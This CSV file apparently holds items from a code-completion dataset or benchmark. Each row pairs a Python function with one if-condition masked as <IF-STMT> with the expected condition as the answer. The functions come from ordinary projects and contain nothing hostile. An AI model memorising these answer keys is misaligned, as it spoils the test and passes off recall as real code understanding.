2113,"def _delete_access_key(self, params):<tab>sys.stdout.write(""Deleting the IAM user access keys... "")<tab>list_access_keys = self.iam.get_paginator(""list_access_keys"")<tab>try:<tab><tab>for response in list_access_keys.paginate(UserName=params.user_name):<tab><tab><tab>for access_key in response[""AccessKeyMetadata""]:<tab><tab><tab><tab>self.iam.delete_access_key(<tab><tab><tab><tab><tab>UserName=params.user_name, AccessKeyId=access_key[""AccessKeyId""]<tab><tab><tab><tab>)<tab>except ClientError as e:<tab><tab><IF-STMT><tab><tab><tab>raise e<tab>sys.stdout.write(""DONE\n"")","if e . response . get ( ""Error"" , { } ) . get ( ""Code"" ) != ""NoSuchEntity"" :",181
2114,"def run_pending(self, now=None):<tab>""""""Runs the command if scheduled""""""<tab>now = now or datetime.now()<tab>if self.is_enabled():<tab><tab>if self.last_run is None:<tab><tab><tab>self.last_run = now<tab><tab>next_time = self.schedule(self.last_run).get_next()<tab><tab><IF-STMT><tab><tab><tab>self.last_run = now<tab><tab><tab>return self.run()<tab>return -1",if next_time < now :,119
2115,"def parse_row(cls, doc_row):<tab>row = {}<tab>for field_name, field in FIELD_MAP.items():<tab><tab><IF-STMT><tab><tab><tab>field_value = doc_row[field[1]]<tab><tab>else:<tab><tab><tab>field_value = """"<tab><tab>if len(field) >= 3 and callable(field[2]):<tab><tab><tab>field_value = field[2](field_value)<tab><tab>row[field_name] = field_value<tab>return row",if len ( doc_row ) > field [ 1 ] :,127
2116,"def list(self, items, columns=4, width=80):<tab>items = list(sorted(items))<tab>colw = width // columns<tab>rows = (len(items) + columns - 1) // columns<tab>for row in range(rows):<tab><tab>for col in range(columns):<tab><tab><tab>i = col * rows + row<tab><tab><tab>if i < len(items):<tab><tab><tab><tab>self.output.write(items[i])<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.output.write("" "" + "" "" * (colw - 1 - len(items[i])))<tab><tab>self.output.write(""\n"")",if col < columns - 1 :,158
2117,"def _on_message(self, storage, data):<tab>if ""_meta"" in data and ""session_id"" in data[""_meta""]:<tab><tab>self.session_id = data[""_meta""][""session_id""]<tab>if is_blacklisted(data.get(""url"", """")):<tab><tab>blacklist_error(data, self)<tab><tab>return<tab>command = data[""_command""]<tab>command = self._handlers.get(command, command)<tab>with data_store_context():<tab><tab>commands = Commands(data, self, storage)<tab><tab>result = getattr(commands, command, lambda: None)()<tab>if result:<tab><tab>result.setdefault(""_command"", data.get(""_callback"", command))<tab><tab><IF-STMT><tab><tab><tab>result[""id""] = data[""_meta""][""id""]<tab>return result","if ""_meta"" in data and ""id"" in data [ ""_meta"" ] :",198
2118,"def get_model_params(problem_type: str, hyperparameters):<tab>penalty = hyperparameters.get(""penalty"", L2)<tab>handle_text = hyperparameters.get(""handle_text"", IGNORE)<tab>if problem_type == REGRESSION:<tab><tab><IF-STMT><tab><tab><tab>model_class = Ridge<tab><tab>elif penalty == L1:<tab><tab><tab>model_class = Lasso<tab><tab>else:<tab><tab><tab>logger.warning(<tab><tab><tab><tab>""Unknown value for penalty {} - supported types are [l1, l2] - falling back to l2"".format(<tab><tab><tab><tab><tab>penalty<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>penalty = L2<tab><tab><tab>model_class = Ridge<tab>else:<tab><tab>model_class = LogisticRegression<tab>return model_class, penalty, handle_text",if penalty == L2 :,200
2119,"def get_queryset(self):<tab>if self.queryset is not None:<tab><tab>return self.queryset._clone()<tab>elif self.model is not None:<tab><tab>qs = self.model._default_manager<tab><tab>if self.model in access_registry:<tab><tab><tab>access_class = access_registry[self.model]<tab><tab><tab>if access_class.select_related:<tab><tab><tab><tab>qs = qs.select_related(*access_class.select_related)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>qs = qs.prefetch_related(*access_class.prefetch_related)<tab><tab>return qs<tab>else:<tab><tab>return super(GenericAPIView, self).get_queryset()",if access_class . prefetch_related :,171
2120,"def map_package(shutit_pexpect_session, package, install_type):<tab>""""""If package mapping exists, then return it, else return package.""""""<tab>if package in PACKAGE_MAP.keys():<tab><tab>for itype in PACKAGE_MAP[package].keys():<tab><tab><tab>if itype == install_type:<tab><tab><tab><tab>ret = PACKAGE_MAP[package][install_type]<tab><tab><tab><tab>if isinstance(ret, str):<tab><tab><tab><tab><tab>return ret<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>ret(shutit_pexpect_session)<tab><tab><tab><tab><tab>return """"<tab># Otherwise, simply return package<tab>return package",if callable ( ret ) :,163
2121,"def find_missing_cache_files(<tab>self, modules: Dict[str, str], manager: build.BuildManager) -> Set[str]:<tab>ignore_errors = True<tab>missing = {}<tab>for id, path in modules.items():<tab><tab>meta = build.find_cache_meta(id, path, manager)<tab><tab><IF-STMT><tab><tab><tab>missing[id] = path<tab>return set(missing.values())","if not build . validate_meta ( meta , id , path , ignore_errors , manager ) :",117
2122,"def parse_percent_formats(data, tree):<tab>percent_formats = data.setdefault(""percent_formats"", {})<tab>for elem in tree.findall("".//percentFormats/percentFormatLength""):<tab><tab>type = elem.attrib.get(""type"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>pattern = text_type(elem.findtext(""percentFormat/pattern""))<tab><tab>percent_formats[type] = numbers.parse_pattern(pattern)","if _should_skip_elem ( elem , type , percent_formats ) :",116
2123,"def nan2none(l):<tab>for idx, val in enumerate(l):<tab><tab><IF-STMT><tab><tab><tab>l[idx] = nan2none(l[idx])<tab><tab>elif isnum(val) and math.isnan(val):<tab><tab><tab>l[idx] = None<tab>return l","if isinstance ( val , Sequence ) :",76
2124,"def process(self, message: Message, **kwargs: Any) -> None:<tab>for attribute in DENSE_FEATURIZABLE_ATTRIBUTES:<tab><tab><IF-STMT><tab><tab><tab>message.set(<tab><tab><tab><tab>SPACY_DOCS[attribute], self.doc_for_text(message.get(attribute))<tab><tab><tab>)",if message . get ( attribute ) :,81
2125,"def accessSlice(self, node):<tab>self.visit(node.value)<tab>node.obj = self.getObj(node.value)<tab>self.access = _access.INPUT<tab>lower, upper = node.slice.lower, node.slice.upper<tab>if lower:<tab><tab>self.visit(lower)<tab><IF-STMT><tab><tab>self.visit(upper)<tab>if isinstance(node.obj, intbv):<tab><tab>if self.kind == _kind.DECLARATION:<tab><tab><tab>self.require(lower, ""Expected leftmost index"")<tab><tab><tab>leftind = self.getVal(lower)<tab><tab><tab>if upper:<tab><tab><tab><tab>rightind = self.getVal(upper)<tab><tab><tab>else:<tab><tab><tab><tab>rightind = 0<tab><tab><tab>node.obj = node.obj[leftind:rightind]",if upper :,198
2126,"def forg(x, prec=3):<tab>if prec == 3:<tab><tab># for 3 decimals<tab><tab><IF-STMT><tab><tab><tab>return ""%9.3g"" % x<tab><tab>else:<tab><tab><tab>return ""%9.3f"" % x<tab>elif prec == 4:<tab><tab>if (abs(x) >= 1e4) or (abs(x) < 1e-4):<tab><tab><tab>return ""%10.4g"" % x<tab><tab>else:<tab><tab><tab>return ""%10.4f"" % x<tab>else:<tab><tab>raise ValueError(<tab><tab><tab>""`prec` argument must be either 3 or 4, not {prec}"".format(prec=prec)<tab><tab>)",if ( abs ( x ) >= 1e4 ) or ( abs ( x ) < 1e-4 ) :,185
2127,"def pseudo_raw_input(self, prompt):<tab>""""""copied from cmd's cmdloop; like raw_input, but accounts for changed stdin, stdout""""""<tab>if self.use_rawinput:<tab><tab>try:<tab><tab><tab>line = raw_input(prompt)<tab><tab>except EOFError:<tab><tab><tab>line = ""EOF""<tab>else:<tab><tab>self.stdout.write(prompt)<tab><tab>self.stdout.flush()<tab><tab>line = self.stdin.readline()<tab><tab><IF-STMT><tab><tab><tab>line = ""EOF""<tab><tab>else:<tab><tab><tab>if line[-1] == ""\n"":  # this was always true in Cmd<tab><tab><tab><tab>line = line[:-1]<tab>return line",if not len ( line ) :,172
2128,"def _find_first_unescaped(dn, char, pos):<tab>while True:<tab><tab>pos = dn.find(char, pos)<tab><tab>if pos == -1:<tab><tab><tab>break  # no char found<tab><tab>if pos > 0 and dn[pos - 1] != ""\\"":  # unescaped char<tab><tab><tab>break<tab><tab><IF-STMT>  # may be unescaped<tab><tab><tab>escaped = True<tab><tab><tab>for c in dn[pos - 2 : 0 : -1]:<tab><tab><tab><tab>if c == ""\\"":<tab><tab><tab><tab><tab>escaped = not escaped<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>break<tab><tab><tab>if not escaped:<tab><tab><tab><tab>break<tab><tab>pos += 1<tab>return pos","elif pos > 1 and dn [ pos - 1 ] == ""\\"" :",181
2129,"def update_user(username):<tab>permission = UserAdminPermission(username)<tab>if permission.can():<tab><tab>update_request = request.get_json()<tab><tab><IF-STMT><tab><tab><tab>logger.debug(""Updating user password"")<tab><tab><tab>model.user.change_password(<tab><tab><tab><tab>get_authenticated_user(), update_request[""password""]<tab><tab><tab>)<tab><tab>return jsonify(<tab><tab><tab>{<tab><tab><tab><tab>""username"": get_authenticated_user().username,<tab><tab><tab><tab>""email"": get_authenticated_user().email,<tab><tab><tab>}<tab><tab>)<tab>abort(403)","if ""password"" in update_request :",154
2130,"def pages(self):<tab>if hasattr(self, ""_pages""):<tab><tab>return self._pages<tab>doctop = 0<tab>pp = self.pages_to_parse<tab>self._pages = []<tab>for i, page in enumerate(PDFPage.create_pages(self.doc)):<tab><tab>page_number = i + 1<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>p = Page(self, page, page_number=page_number, initial_doctop=doctop)<tab><tab>self._pages.append(p)<tab><tab>doctop += p.height<tab>return self._pages",if pp is not None and page_number not in pp :,155
2131,"def image_size(img_data, pure_python=False):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return imgsize.get_size(PeekableStringIO(img_data))<tab><tab>if Image is not None and not pure_python:<tab><tab><tab>return Image.open(cStringIO.StringIO(img_data)).size<tab>except (ValueError, imgsize.UnknownSize):<tab><tab>pass<tab>return None",if imgsize is not None :,105
2132,"def email_csv_query(request, query_id):<tab>if request.is_ajax():<tab><tab>email = request.POST.get(""email"", None)<tab><tab><IF-STMT><tab><tab><tab>execute_query.delay(query_id, email)<tab><tab><tab>return HttpResponse(content={""message"": ""message was sent successfully""})<tab>return HttpResponse(status=403)",if email :,86
2133,"def _groups_args_split(self, kwargs):<tab>groups_args_split = []<tab>groups = kwargs[""groups""]<tab>for key, group in groups.iteritems():<tab><tab>mykwargs = kwargs.copy()<tab><tab>del mykwargs[""groups""]<tab><tab>if ""group_name"" in group:<tab><tab><tab>mykwargs[""source_security_group_name""] = group[""group_name""]<tab><tab><IF-STMT><tab><tab><tab>mykwargs[""source_security_group_owner_id""] = group[""user_id""]<tab><tab>if ""group_id"" in group:<tab><tab><tab>mykwargs[""source_security_group_id""] = group[""group_id""]<tab><tab>groups_args_split.append(mykwargs)<tab>return groups_args_split","if ""user_id"" in group :",186
2134,"def get_subnet_groups(self, region: str, vpc: str):<tab>try:<tab><tab>await self._cache_subnet_groups(region)<tab><tab>return [<tab><tab><tab>subnet_group<tab><tab><tab>for subnet_group in self._subnet_groups_cache[region]<tab><tab><tab><IF-STMT><tab><tab>]<tab>except Exception as e:<tab><tab>print_exception(f""Failed to get RDS subnet groups: {e}"")<tab><tab>return []","if subnet_group [ ""VpcId"" ] == vpc",121
2135,def on_state_update(self) -> None:<tab>if self.road:<tab><tab>self.lane_index = self.road.network.get_closest_lane_index(self.position)<tab><tab>self.lane = self.road.network.get_lane(self.lane_index)<tab><tab><IF-STMT><tab><tab><tab>self.history.appendleft(self.create_from(self)),if self . road . record_history :,105
2136,"def delete_old_post_save(<tab>sender, instance, raw, created, update_fields, using, **kwargs):<tab>""""""Post_save on all models with file fields, deletes old files""""""<tab>if raw or created:<tab><tab>return<tab>for field_name, new_file in cache.fields_for_model_instance(instance):<tab><tab>if update_fields is None or field_name in update_fields:<tab><tab><tab>old_file = cache.get_field_attr(instance, field_name)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>delete_file(instance, field_name, old_file, using)<tab># reset cache<tab>cache.make_cleanup_cache(instance)",if old_file != new_file :,171
2137,"def i2h(self, pkt, x):<tab>if x is not None:<tab><tab>if x < 0:<tab><tab><tab>warning(""Fixed3_6: Internal value too negative: %d"" % x)<tab><tab><tab>x = 0<tab><tab><IF-STMT><tab><tab><tab>warning(""Fixed3_6: Internal value too positive: %d"" % x)<tab><tab><tab>x = 999999999<tab><tab>x = x * 1e-6<tab>return x",elif x > 999999999 :,111
2138,"def quick_main(self):<tab>if self.actions.pressed(""cancel""):<tab><tab>self.previs_timer.stop()<tab><tab>return ""main""<tab>if self.actions.mousemove_stop:<tab><tab>self.hovering_edge, _ = self.rfcontext.accel_nearest2D_edge(<tab><tab><tab>max_dist=options[""action dist""]<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.hovering_edge = None<tab>if self.hovering_edge and self.rfcontext.actions.pressed(""quick insert""):<tab><tab>return self.insert_edge_loop_strip()",if self . hovering_edge and not self . hovering_edge . is_valid :,163
2139,def check_status(self) -> None:<tab>join_requested = False<tab>while not join_requested:<tab><tab>status_response = self._interface.communicate_status(check_stop_req=True)<tab><tab>if status_response and status_response.run_should_stop:<tab><tab><tab># TODO(frz): This check is required<tab><tab><tab># until WB-3606 is resolved on server side.<tab><tab><tab><IF-STMT><tab><tab><tab><tab>thread.interrupt_main()<tab><tab><tab><tab>return<tab><tab>join_requested = self._join_event.wait(self._polling_interval),if not wandb . agents . pyagent . is_running ( ) :,157
2140,"def listed(output, pool):<tab>for line in output.splitlines():<tab><tab>name, mountpoint, refquota = line.split(b""\t"")<tab><tab>name = name[len(pool) + 1 :]<tab><tab><IF-STMT><tab><tab><tab>refquota = int(refquota.decode(""ascii""))<tab><tab><tab>if refquota == 0:<tab><tab><tab><tab>refquota = None<tab><tab><tab>yield _DatasetInfo(dataset=name, mountpoint=mountpoint, refquota=refquota)",if name :,116
2141,"def defined_properties(cls, aliases=True, properties=True, rels=True):<tab>from .relationship_manager import RelationshipDefinition<tab>props = {}<tab>for baseclass in reversed(cls.__mro__):<tab><tab>props.update(<tab><tab><tab>dict(<tab><tab><tab><tab>(name, property)<tab><tab><tab><tab>for name, property in vars(baseclass).items()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab>or (<tab><tab><tab><tab><tab>properties<tab><tab><tab><tab><tab>and isinstance(property, Property)<tab><tab><tab><tab><tab>and not isinstance(property, AliasProperty)<tab><tab><tab><tab>)<tab><tab><tab><tab>or (rels and isinstance(property, RelationshipDefinition))<tab><tab><tab>)<tab><tab>)<tab>return props","if ( aliases and isinstance ( property , AliasProperty ) )",182
2142,"def _mock_manager(self, *args, **kwargs):<tab>if kwargs and ""normalize"" not in kwargs:<tab><tab>device_params = kwargs[""device_params""]<tab><tab>device_handler = make_device_handler(device_params)<tab><tab>session = SSHSession(device_handler)<tab><tab>return Manager(session, device_handler)<tab>if args:<tab><tab>if args[0].tag == ""request-pfe-execute"":<tab><tab><tab>file_name = (args[0].findtext(""command"")).replace("" "", ""_"")<tab><tab><tab>return self._read_file(file_name + "".xml"")<tab><tab><IF-STMT><tab><tab><tab>file_name = (args[0].text).replace("" "", ""_"")<tab><tab><tab>return self._read_file(file_name + "".xml"")","elif args [ 0 ] . tag == ""command"" :",193
2143,"def triger_check_network(self, fail=False, force=False):<tab>time_now = time.time()<tab>if not force:<tab><tab>if self._checking_num > 0:<tab><tab><tab>return<tab><tab>if fail or self.network_stat != ""OK"":<tab><tab><tab># Fail or unknown<tab><tab><tab>if time_now - self.last_check_time < 3:<tab><tab><tab><tab>return<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab>self.last_check_time = time_now<tab>threading.Thread(target=self._simple_check_worker).start()",if time_now - self . last_check_time < 10 :,161
2144,"def delete(self):<tab>if not self.force and not self.exists():<tab><tab>return []<tab>cmd = [""delete""]<tab>if self.filename:<tab><tab>cmd.append(""--filename="" + self.filename)<tab>else:<tab><tab>if not self.resource:<tab><tab><tab>self.module.fail_json(msg=""resource required to delete without filename"")<tab><tab>cmd.append(self.resource)<tab><tab>if self.name:<tab><tab><tab>cmd.append(self.name)<tab><tab>if self.label:<tab><tab><tab>cmd.append(""--selector="" + self.label)<tab><tab><IF-STMT><tab><tab><tab>cmd.append(""--all"")<tab><tab>if self.force:<tab><tab><tab>cmd.append(""--ignore-not-found"")<tab>return self._execute(cmd)",if self . all :,189
2145,"def load(self):<tab>""""""load a custom filter""""""<tab>try:<tab><tab><IF-STMT><tab><tab><tab>parser = make_parser()<tab><tab><tab>parser.setContentHandler(FilterParser(self))<tab><tab><tab>with open(self.file, ""r"", encoding=""utf8"") as the_file:<tab><tab><tab><tab>parser.parse(the_file)<tab>except (IOError, OSError):<tab><tab>print(""IO/OSError in _filterlist.py"")<tab>except SAXParseException:<tab><tab>print(""Parser error"")",if os . path . isfile ( self . file ) :,132
2146,"def exitFullscreen(self, container=None):<tab>""""""turns off fullscreen mode for the specified window""""""<tab>if container is None or isinstance(container, UNIVERSAL_STRING):<tab><tab>try:<tab><tab><tab>container = self.widgetManager.get(WIDGET_NAMES.SubWindow, container)<tab><tab>except:<tab><tab><tab>container = self._getTopLevel()<tab>if container.isFullscreen:<tab><tab>container.isFullscreen = False<tab><tab>container.attributes(""-fullscreen"", False)<tab><tab><IF-STMT><tab><tab><tab>container.unbind(""<Escape>"", container.escapeBindId)<tab><tab>with PauseLogger():<tab><tab><tab>self._doTitleBar()<tab><tab>return True<tab>else:<tab><tab>return False",if container . escapeBindId is not None :,179
2147,"def __get__(self, instance: Any, owner: Type) -> Any:<tab># class attribute accessed<tab>if instance is None:<tab><tab>return self<tab>field = self.field<tab>instance_dict = instance.__dict__<tab>to_python = self._to_python<tab>value = instance_dict[field]<tab>if self.lazy_coercion and to_python is not None:<tab><tab>evaluated_fields: Set[str]<tab><tab>evaluated_fields = instance.__evaluated_fields__<tab><tab><IF-STMT><tab><tab><tab>if value is not None or self.required:<tab><tab><tab><tab>value = instance_dict[field] = to_python(value)<tab><tab><tab>evaluated_fields.add(field)<tab>return value",if field not in evaluated_fields :,178
2148,"def ip_list(_):<tab>ips = []<tab>for ip in _.split("" ""):<tab><tab>if not ip:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>ips.append(IP.create(ip))<tab><tab>else:<tab><tab><tab>raise TypeError(""ip %s is invalid"" % ip)<tab>return ips",elif isip ( ip ) :,82
2149,"def _parse_fields(line, legacy=False):<tab>""""""Removes '\n' from fields line and returns fields as a list (columns).""""""<tab>line = line.rstrip(""\n"")<tab>if legacy:<tab><tab>fields = line.split("","")<tab>else:<tab><tab>line = line.split(""# Fields: "")[1]<tab><tab>fields = line.split("", "")<tab>columns = []<tab>for field in fields:<tab><tab><IF-STMT><tab><tab><tab>raise BLAST7FormatError(<tab><tab><tab><tab>""Unrecognized field (%r).""<tab><tab><tab><tab>"" Supported fields: %r"" % (field, set(column_converter.keys()))<tab><tab><tab>)<tab><tab>columns.append(column_converter[field])<tab>return columns",if field not in column_converter :,175
2150,"def _resolve_plugin_path(path):<tab>if not os.path.isabs(path):<tab><tab>p = os.path.normpath(os.path.join(sublime.packages_path(), ""User"", path))<tab><tab><IF-STMT><tab><tab><tab>p = os.path.normpath(<tab><tab><tab><tab>os.path.join(sublime.packages_path(), ""LaTeXTools"", path)<tab><tab><tab>)<tab><tab>return p<tab>return path",if not os . path . exists ( p ) :,120
2151,"def _deep_copy_dict(source, dest):<tab>for key, value in source.items():<tab><tab><IF-STMT><tab><tab><tab>dest[key] = {}<tab><tab><tab>TqApi._deep_copy_dict(value, dest[key])<tab><tab>else:<tab><tab><tab>dest[key] = value","if isinstance ( value , Entity ) :",79
2152,"def encode(self):<tab>if not isinstance(self.expr, m2_expr.ExprInt):<tab><tab>return False<tab>if not test_set_sf(self.parent, self.expr.size):<tab><tab>return False<tab>value = int(self.expr)<tab>if value < 1 << self.l:<tab><tab>self.parent.shift.value = 0<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>value >>= 12<tab><tab>if value >= 1 << self.l:<tab><tab><tab>return False<tab><tab>self.parent.shift.value = 1<tab>self.value = value<tab>return True",if value & 0xFFF :,154
2153,"def test_read_audio_properties(self):<tab>mediafile = self._mediafile_fixture(""full"")<tab>for key, value in self.audio_properties.items():<tab><tab><IF-STMT><tab><tab><tab>self.assertAlmostEqual(getattr(mediafile, key), value, delta=0.1)<tab><tab>else:<tab><tab><tab>self.assertEqual(getattr(mediafile, key), value)","if isinstance ( value , float ) :",92
2154,"def get_all_fix_names(fixer_pkg, remove_prefix=True):<tab>""""""Return a sorted list of all available fix names in the given package.""""""<tab>pkg = __import__(fixer_pkg, [], [], [""*""])<tab>fixer_dir = os.path.dirname(pkg.__file__)<tab>fix_names = []<tab>for name in sorted(os.listdir(fixer_dir)):<tab><tab><IF-STMT><tab><tab><tab>if remove_prefix:<tab><tab><tab><tab>name = name[4:]<tab><tab><tab>fix_names.append(name[:-3])<tab>return fix_names","if name . startswith ( ""fix_"" ) and name . endswith ( "".py"" ) :",147
2155,"def _get_arg(self, f_name, args, kws, arg_no, arg_name, default=None, err_msg=None):<tab>arg = None<tab>if len(args) > arg_no:<tab><tab>arg = args[arg_no]<tab>elif arg_name in kws:<tab><tab>arg = kws[arg_name]<tab>if arg is None:<tab><tab>if default is not None:<tab><tab><tab>return default<tab><tab><IF-STMT><tab><tab><tab>err_msg = ""{} requires '{}' argument"".format(f_name, arg_name)<tab><tab>raise ValueError(err_msg)<tab>return arg",if err_msg is None :,152
2156,"def get_satellite_list(self, daemon_type=""""):<tab>res = {}<tab>for t in [""arbiter"", ""scheduler"", ""poller"", ""reactionner"", ""receiver"", ""broker""]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>satellite_list = []<tab><tab>res[t] = satellite_list<tab><tab>daemon_name_attr = t + ""_name""<tab><tab>daemons = self.app.get_daemons(t)<tab><tab>for dae in daemons:<tab><tab><tab>if hasattr(dae, daemon_name_attr):<tab><tab><tab><tab>satellite_list.append(getattr(dae, daemon_name_attr))<tab>return res",if daemon_type and daemon_type != t :,175
2157,"def do_upload(file: Path, metadata: Metadata, repo_name=None):<tab>""""""Upload a file to an index server.""""""<tab>repo = get_repository(repo_name)<tab>upload_file(file, metadata, repo)<tab>if repo[""is_warehouse""]:<tab><tab>domain = urlparse(repo[""url""]).netloc<tab><tab><IF-STMT><tab><tab><tab>domain = domain[7:]<tab><tab>log.info(""Package is at https://%s/project/%s/"", domain, metadata.name)<tab>else:<tab><tab>log.info(""Package is at %s/%s"", repo[""url""], metadata.name)","if domain . startswith ( ""upload."" ) :",147
2158,"def __next__(self):<tab>for res in self._execution_context:<tab><tab>for item in res:<tab><tab><tab>for operator in self._local_aggregators:<tab><tab><tab><tab>if isinstance(item, dict) and item:<tab><tab><tab><tab><tab>operator.aggregate(item[""item""])<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>operator.aggregate(item)<tab>if self._results is None:<tab><tab>self._results = []<tab><tab>for operator in self._local_aggregators:<tab><tab><tab>self._results.append(operator.get_result())<tab>if self._result_index < len(self._results):<tab><tab>res = self._results[self._result_index]<tab><tab>self._result_index += 1<tab><tab>return res<tab>raise StopIteration","elif isinstance ( item , numbers . Number ) :",188
2159,"def __iter__(self):<tab>yield pd.Timestamp.utcnow(), SESSION_START<tab>while True:<tab><tab>current_time = pd.Timestamp.utcnow()<tab><tab>current_minute = current_time.floor(""1 min"")<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if self._last_emit is None or current_minute > self._last_emit:<tab><tab><tab>log.debug(""emitting minutely bar: {}"".format(current_minute))<tab><tab><tab>self._last_emit = current_minute<tab><tab><tab>yield current_minute, BAR<tab><tab>else:<tab><tab><tab>sleep(1)<tab>yield current_minute, SESSION_END",if self . end is not None and current_minute >= self . end :,168
2160,"def _escape_attrib(text):<tab># escape attribute value<tab>try:<tab><tab><IF-STMT><tab><tab><tab>text = text.replace(""&"", ""&amp;"")<tab><tab>if ""<"" in text:<tab><tab><tab>text = text.replace(""<"", ""&lt;"")<tab><tab>if "">"" in text:<tab><tab><tab>text = text.replace("">"", ""&gt;"")<tab><tab>if '""' in text:<tab><tab><tab>text = text.replace('""', ""&quot;"")<tab><tab>if ""\n"" in text:<tab><tab><tab>text = text.replace(""\n"", ""&#10;"")<tab><tab>return text<tab>except (TypeError, AttributeError):  # pragma: no cover<tab><tab>_raise_serialization_error(text)","if ""&"" in text :",160
2161,"def _read_row_from_packet(self, packet):<tab>row = []<tab>for encoding, converter in self.converters:<tab><tab>try:<tab><tab><tab>data = packet.read_length_coded_string()<tab><tab>except IndexError:<tab><tab><tab># No more columns in this row<tab><tab><tab># See https://github.com/PyMySQL/PyMySQL/pull/434<tab><tab><tab>break<tab><tab>if data is not None:<tab><tab><tab>if encoding is not None:<tab><tab><tab><tab>data = data.decode(encoding)<tab><tab><tab>if DEBUG:<tab><tab><tab><tab>print(""DEBUG: DATA = "", data)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data = converter(data)<tab><tab>row.append(data)<tab>return tuple(row)",if converter is not None :,186
2162,"def dumpMenuTree(self, aList, level=0, path=""""):<tab>for z in aList:<tab><tab>kind, val, val2 = z<tab><tab><IF-STMT><tab><tab><tab>name = self.getName(val, val2)<tab><tab><tab>g.es_print(<tab><tab><tab><tab>""%s %s (%s) [%s]"" % (""<tab>"" * (level + 0), val, val2, path + ""/"" + name)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>name = self.getName(kind.replace(""@menu "", """"))<tab><tab><tab>g.es_print(""%s %s... [%s]"" % (""<tab>"" * (level), kind, path + ""/"" + name))<tab><tab><tab>self.dumpMenuTree(val, level + 1, path=path + ""/"" + name)","if kind == ""@item"" :",196
2163,"def startElement(self, name, attrs, connection):<tab>if name == ""SecurityGroups"":<tab><tab>return self.security_groups<tab>elif name == ""ClassicLinkVPCSecurityGroups"":<tab><tab>return self.classic_link_vpc_security_groups<tab>elif name == ""BlockDeviceMappings"":<tab><tab><IF-STMT><tab><tab><tab>self.block_device_mappings = BDM()<tab><tab>else:<tab><tab><tab>self.block_device_mappings = ResultSet([(""member"", BlockDeviceMapping)])<tab><tab>return self.block_device_mappings<tab>elif name == ""InstanceMonitoring"":<tab><tab>self.instance_monitoring = InstanceMonitoring(self)<tab><tab>return self.instance_monitoring",if self . use_block_device_types :,171
2164,"def __get_dev_and_disk(topology):<tab>rv = []<tab>for values in topology.values():<tab><tab>values = values.copy()<tab><tab>while values:<tab><tab><tab>value = values.pop()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rv.append((value[""path""].replace(""/dev/"", """"), value[""disk""]))<tab><tab><tab>values += value.get(""children"") or []<tab>return rv","if value [ ""type"" ] == ""DISK"" :",107
2165,"def _process_events(self, event_list):<tab>for key, mask in event_list:<tab><tab>fileobj, (reader, writer) = key.fileobj, key.data<tab><tab>if mask & selectors.EVENT_READ and reader is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.remove_reader(fileobj)<tab><tab><tab>else:<tab><tab><tab><tab>self._add_callback(reader)<tab><tab>if mask & selectors.EVENT_WRITE and writer is not None:<tab><tab><tab>if writer._cancelled:<tab><tab><tab><tab>self.remove_writer(fileobj)<tab><tab><tab>else:<tab><tab><tab><tab>self._add_callback(writer)",if reader . _cancelled :,158
2166,"def colourLabels(self):<tab>if self.showAttr and self.hasAttr:<tab><tab>self.canvas.itemconfigure(self.attrId, fill=self.fgColour)<tab>try:<tab><tab><IF-STMT><tab><tab><tab>self.label.config(background=self.bgColour, fg=self.fgColour)<tab><tab>else:<tab><tab><tab>self.label.config(background=self.bgHColour, fg=self.fgHColour)<tab>except:<tab><tab>pass",if not self . selected :,122
2167,"def validate_char_lengths(self):<tab>for field in self._meta.get_fields():<tab><tab><IF-STMT><tab><tab><tab>if (<tab><tab><tab><tab>isinstance(getattr(self, field.name), basestring)<tab><tab><tab><tab>and len(getattr(self, field.name)) > field.max_length<tab><tab><tab>):<tab><tab><tab><tab>raise Exception(<tab><tab><tab><tab><tab>""Role %s value exceeeds max length of %s.""<tab><tab><tab><tab><tab>% (field.name, field.max_length)<tab><tab><tab><tab>)","if not field . is_relation and field . get_internal_type ( ) == ""CharField"" :",149
2168,"def _render_lang_List(self, element):<tab>with self.buffer.foldable_lines():<tab><tab>self.buffer.write(""["", style=self.styles.bracket)<tab><tab>item_count = len(element.items)<tab><tab><IF-STMT><tab><tab><tab>with self.buffer.indent():<tab><tab><tab><tab>for idx, item in enumerate(element.items):<tab><tab><tab><tab><tab>self._render(item)<tab><tab><tab><tab><tab>if idx < (item_count - 1):<tab><tab><tab><tab><tab><tab>self.buffer.write("","")<tab><tab><tab><tab><tab><tab>self.buffer.mark_line_break()<tab><tab>if element.trimmed:<tab><tab><tab>self.buffer.write(""..."")<tab><tab>self.buffer.write(""]"", style=self.styles.bracket)",if item_count :,183
2169,"def do_dialog():<tab>""""""Post dialog and handle user interaction until quit""""""<tab>my_dlg = Dlg.GetNewDialog(ID_MAIN, -1)<tab>while 1:<tab><tab>n = Dlg.ModalDialog(None)<tab><tab>if n == ITEM_LOOKUP_BUTTON:<tab><tab><tab>tp, h, rect = my_dlg.GetDialogItem(ITEM_LOOKUP_ENTRY)<tab><tab><tab>txt = Dlg.GetDialogItemText(h)<tab><tab><tab>tp, h, rect = my_dlg.GetDialogItem(ITEM_RESULT)<tab><tab><tab>Dlg.SetDialogItemText(h, dnslookup(txt))<tab><tab><IF-STMT><tab><tab><tab>break",elif n == ITEM_QUIT_BUTTON :,173
